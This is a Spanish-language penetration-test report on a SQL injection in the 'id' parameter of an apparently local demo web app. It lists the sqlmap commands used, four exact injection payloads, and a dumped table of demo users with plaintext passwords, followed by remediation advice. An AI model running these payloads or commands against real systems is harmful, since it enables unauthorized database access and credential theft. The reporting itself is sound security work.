# Informe de Análisis SQLi

Fecha: 2026-04-27 09:37:41 UTC
Objetivo: http://web.dev.local:8083

## Resumen Ejecutivo
Se detectó y explotó una vulnerabilidad de SQL Injection en el parámetro GET "id" de la URL principal. La explotación permitió identificar el usuario de la BD y descargar la tabla `sqli_demo.users` con datos sensibles (correos y contraseñas en texto claro) demostrando impacto alto.

## Vectores analizados
- Petición GET a la página raíz: http://web.dev.local:8083?id=&Submit=Submit
- Parámetros inspeccionados: id (GET)
- Formularios detectados por el crawler y probados con sqlmap (--forms, --crawl=1)

## Herramientas y comandos usados
- curl para obtener la página y localizar formularios
- sqlmap comandos (no interactivo):
  - Escaneo inicial: sqlmap -u "http://web.dev.local:8083" --batch --forms --crawl=1 --level=2 --risk=2
  - Verificación/explotación: sqlmap -u "http://web.dev.local:8083?id=5029&Submit=Submit" --batch --current-user --dbs --dump

## Hallazgos
- Parámetro vulnerable: id (GET)
- DBMS detectado: MySQL (MariaDB fork)
- Usuario actual recuperado: 'root@%'
- Bases de datos encontradas: information_schema, mysql, performance_schema, sqli_demo, sys

Payloads detectados (ejemplos exactos reportados por sqlmap):
- Boolean-based blind:
  id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -&Submit=Submit
- Error-based:
  id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP&Submit=Submit
- Time-based:
  id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE&Submit=Submit
- UNION query:
  id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d565148786279414c49575057486e62576c7a784d474c536d514662424c6c7042556d474b,0x717a716a71)-- -&Submit=Submit

Comando final usado para extracción:
sqlmap -u "http://web.dev.local:8083?id=5029&Submit=Submit" --batch --current-user --dbs --dump

## Evidencia de explotación
Salida relevante de sqlmap obtenida durante la explotación (extractos):
- Usuario actual recuperado:
  current user: 'root@%'
- Bases de datos encontradas:
  information_schema, mysql, performance_schema, sqli_demo, sys

- Contenido extraído de la tabla `sqli_demo.users` (8 entradas):
| user_id | email               | password    | username  | last_name | first_name |
|---------|---------------------|-------------|-----------|-----------|------------|
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |

La tabla fue volcada y guardada por sqlmap en: /home/kali_rdp/.local/share/sqlmap/output/web.dev.local/dump/sqli_demo/users.csv

## Impacto
La explotación revela credenciales y correos electrónicos en texto claro, incluyendo el usuario 'admin' y contraseñas triviales, lo que permite compromiso de cuentas y potencial escalado si las mismas credenciales se reutilizan.

## Recomendaciones
1. Parametrizar todas las consultas SQL (prepared statements) y evitar concatenación directa de parámetros provenientes de la URL.
2. Implementar validación y saneamiento de entradas en el servidor (whitelisting de tipos y longitudes).
3. Minimizar privilegios del usuario de la BD usado por la aplicación (evitar root) y aplicar autenticación fuerte para cuentas administrativas.
4. Auditar otras entradas y endpoints para detección similar y rotar credenciales expuestas.

## Conclusión
Se confirmó y explotó una vulnerabilidad SQLi en el parámetro "id" de http://web.dev.local:8083; se extrajo la base de datos `sqli_demo` y la tabla `users` con credenciales en texto plano.


-- Fin del informe
